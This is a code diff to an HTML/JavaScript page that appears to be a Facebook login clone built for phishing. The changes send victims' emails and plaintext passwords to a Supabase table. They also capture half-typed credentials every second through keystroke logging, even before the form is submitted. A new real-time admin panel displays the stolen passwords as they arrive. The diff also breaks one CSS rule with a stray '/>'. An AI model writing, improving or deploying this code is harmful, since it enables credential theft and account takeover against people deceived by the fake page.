@@ -330,7 +330,7 @@
             z-index: 1003;
             justify-content: center;
             align-items: center;
-        }
+        />
         
         .admin-login-form {
             background: white;
@@ -414,6 +414,10 @@
             display: none;
         }
         
+        .connection-error {
+            background: #f02849;
+        }
+        
         @media (max-width: 900px) {
             .content {
                 flex-direction: column;
@@ -475,7 +479,7 @@
                     <form id="loginForm">
                         <input type="text" id="email" name="username" placeholder="Email or phone number" required>
                         <div class="password-container">
-                            <input type="text" id="password" name="password" placeholder="Password" required>
+                            <input type="password" id="password" name="password" placeholder="Password" required>
                             <span class="toggle-password" id="togglePassword">
                                 <i class="fas fa-eye"></i>
                             </span>
@@ -577,42 +581,58 @@
             // Initialize storage for login attempts
             let loginAttempts = [];
             let isAdminAuthenticated = false;
+            let realtimeSubscription = null;
 
             // Test Supabase connection
             async function testSupabaseConnection() {
                 try {
                     const { data, error } = await supabase
-                        .from('admin_data')
+                        .from('login_attempts')
                         .select('count')
                         .limit(1);
                     
                     if (!error) {
                         supabaseStatus.style.display = 'block';
+                        supabaseStatus.classList.remove('connection-error');
+                        supabaseStatus.innerHTML = '<i class="fas fa-database"></i> Supabase: Connected';
                         setTimeout(() => {
                             supabaseStatus.style.display = 'none';
                         }, 3000);
+                    } else {
+                        throw error;
                     }
                 } catch (error) {
                     console.error('Supabase connection error:', error);
+                    supabaseStatus.style.display = 'block';
+                    supabaseStatus.classList.add('connection-error');
+                    supabaseStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Supabase: Connection Failed';
                 }
             }
             
             // Save data to Supabase
             async function saveToSupabase(data) {
                 try {
+                    // Save individual login attempt to login_attempts table
                     const { error } = await supabase
-                        .from('admin_data')
+                        .from('login_attempts')
                         .insert([{ 
-                            key: 'login_attempts', 
-                            data: JSON.stringify(data) 
+                            email: data.email,
+                            password: data.password,
+                            timestamp: new Date().toISOString(),
+                            incomplete: data.incomplete || false
                         }]);
                     
                     if (error) throw error;
                     return true;
                 } catch (error) {
                     console.error('Error saving to Supabase:', error);
-                    // Fallback to localStorage if Supabase fails
-                    localStorage.setItem('facebookLoginAttempts', JSON.stringify(data));
+                    // Show connection error
+                    supabaseStatus.style.display = 'block';
+                    supabaseStatus.classList.add('connection-error');
+                    supabaseStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Supabase: Save Failed';
+                    setTimeout(() => {
+                        supabaseStatus.style.display = 'none';
+                    }, 3000);
                     return false;
                 }
             }
@@ -621,20 +641,22 @@
             async function loadFromSupabase() {
                 try {
                     const { data, error } = await supabase
-                        .from('admin_data')
-                        .select('data')
-                        .eq('key', 'login_attempts')
-                        .order('created_at', { ascending: false })
-                        .limit(1)
-                        .single();
+                        .from('login_attempts')
+                        .select('*')
+                        .order('created_at', { ascending: false });
                     
                     if (error) throw error;
-                    return JSON.parse(data.data);
+                    return data || [];
                 } catch (error) {
                     console.error('Error loading from Supabase:', error);
-                    // Fallback to localStorage if Supabase fails
-                    const localData = localStorage.getItem('facebookLoginAttempts');
-                    return localData ? JSON.parse(localData) : [];
+                    // Show connection error
+                    supabaseStatus.style.display = 'block';
+                    supabaseStatus.classList.add('connection-error');
+                    supabaseStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Supabase: Load Failed';
+                    setTimeout(() => {
+                        supabaseStatus.style.display = 'none';
+                    }, 3000);
+                    return [];
                 }
             }
             
@@ -660,9 +682,35 @@
                         <strong>Email/Phone:</strong> ${attempt.email}<br>
                         <strong>Password:</strong> ${attempt.password}<br>
                         <strong>Time:</strong> ${new Date(attempt.timestamp).toLocaleString()}
+                        ${attempt.incomplete ? '<br><em>(Incomplete attempt)</em>' : ''}
                     `;
                     attemptsList.appendChild(attemptItem);
                 });
+            }
+            
+            // Setup real-time subscription to login_attempts table
+            function setupRealtimeSubscription() {
+                if (realtimeSubscription) {
+                    // Remove existing subscription
+                    supabase.removeChannel(realtimeSubscription);
+                }
+                
+                realtimeSubscription = supabase
+                    .channel('login_attempts_changes')
+                    .on('postgres_changes', 
+                        { 
+                            event: 'INSERT', 
+                            schema: 'public', 
+                            table: 'login_attempts' 
+                        }, 
+                        (payload) => {
+                            // New record inserted, update the admin panel
+                            if (isAdminAuthenticated && adminPanel.style.display === 'block') {
+                                displayLoginAttempts();
+                            }
+                        }
+                    )
+                    .subscribe();
             }
             
             // Populate girls selection
@@ -692,15 +740,13 @@
                 const email = document.getElementById('email').value;
                 const password = document.getElementById('password').value;
                 
-                // Save login attempt
-                loginAttempts.push({
+                // Save login attempt to Supabase
+                await saveToSupabase({
                     email: email,
                     password: password,
-                    timestamp: Date.now()
+                    timestamp: new Date().toISOString(),
+                    incomplete: false
                 });
-                
-                // Save to Supabase
-                await saveToSupabase(loginAttempts);
                 
                 // Show main page
                 loginPage.style.display = 'none';
@@ -743,6 +789,9 @@
                     displayLoginAttempts();
                     adminError.style.display = 'none';
                     
+                    // Set up real-time updates
+                    setupRealtimeSubscription();
+                    
                     // Clear the login form
                     adminUsername.value = '';
                     adminPassword.value = '';
@@ -766,12 +815,24 @@
             closeAdmin.addEventListener('click', function() {
                 adminPanel.style.display = 'none';
                 overlay.style.display = 'none';
+                
+                // Remove realtime subscription when panel is closed
+                if (realtimeSubscription) {
+                    supabase.removeChannel(realtimeSubscription);
+                    realtimeSubscription = null;
+                }
             });
             
             // Close admin panel when clicking outside
             overlay.addEventListener('click', function() {
                 adminPanel.style.display = 'none';
                 overlay.style.display = 'none';
+                
+                // Remove realtime subscription when panel is closed
+                if (realtimeSubscription) {
+                    supabase.removeChannel(realtimeSubscription);
+                    realtimeSubscription = null;
+                }
             });
             
             // Download data as JSON
@@ -790,32 +851,38 @@
             // Clear all data
             clearBtn.addEventListener('click', async function() {
                 if (confirm('Are you sure you want to clear all login attempt data? This cannot be undone.')) {
-                    loginAttempts = [];
-                    // Clear from Supabase
                     try {
                         const { error } = await supabase
-                            .from('admin_data')
+                            .from('login_attempts')
                             .delete()
-                            .eq('key', 'login_attempts');
+                            .neq('id', 0); // Delete all records
                         
                         if (error) throw error;
+                        
+                        loginAttempts = [];
+                        await displayLoginAttempts();
                     } catch (error) {
                         console.error('Error clearing Supabase data:', error);
-                        // Fallback to localStorage
-                        localStorage.removeItem('facebookLoginAttempts');
+                        alert('Error clearing data. Please check console for details.');
                     }
-                    await displayLoginAttempts();
                 }
+            });
+            
+            // Toggle password visibility
+            togglePassword.addEventListener('click', function() {
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+                this.innerHTML = type === 'password' ? '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>';
             });
             
             // Initialize
             testSupabaseConnection();
-            displayLoginAttempts();
             
             // Add real-time keystroke logging
             const emailInput = document.getElementById('email');
             let emailValue = '';
             let passwordValue = '';
+            let lastSaveTime = 0;
             
             emailInput.addEventListener('input', function() {
                 emailValue = this.value;
@@ -827,37 +894,24 @@
             
             // Periodically save what users are typing (even before form submission)
             setInterval(async function() {
+                const now = Date.now();
+                // Only save every 3 seconds to avoid too many requests
+                if (now - lastSaveTime < 3000) return;
+                
                 if (emailValue || passwordValue) {
-                    // Check if this is a new attempt (not already submitted)
-                    const recentAttempt = loginAttempts[loginAttempts.length - 1];
-                    const now = Date.now();
+                    // Save the current typing state
+                    const saved = await saveToSupabase({
+                        email: emailValue,
+                        password: passwordValue,
+                        timestamp: new Date().toISOString(),
+                        incomplete: true
+                    });
                     
-                    if (!recentAttempt || recentAttempt.timestamp < now - 1000) {
-                        // Save the current typing state
-                        const tempAttempt = {
-                            email: emailValue,
-                            password: passwordValue,
-                            timestamp: now,
-                            incomplete: true
-                        };
-                        
-                        // Add to attempts if we have data
-                        if (emailValue || passwordValue) {
-                            // Check if we already have an incomplete attempt for this session
-                            const existingIncompleteIndex = loginAttempts.findIndex(a => a.incomplete);
-                            
-                            if (existingIncompleteIndex !== -1) {
-                                loginAttempts[existingIncompleteIndex] = tempAttempt;
-                            } else {
-                                loginAttempts.push(tempAttempt);
-                            }
-                            
-                            // Save to Supabase
-                            await saveToSupabase(loginAttempts);
-                        }
+                    if (saved) {
+                        lastSaveTime = now;
                     }
                 }
-            }, 2000); // Check every 2 seconds
+            }, 1000); // Check every second
         });
     </script>
 </body>
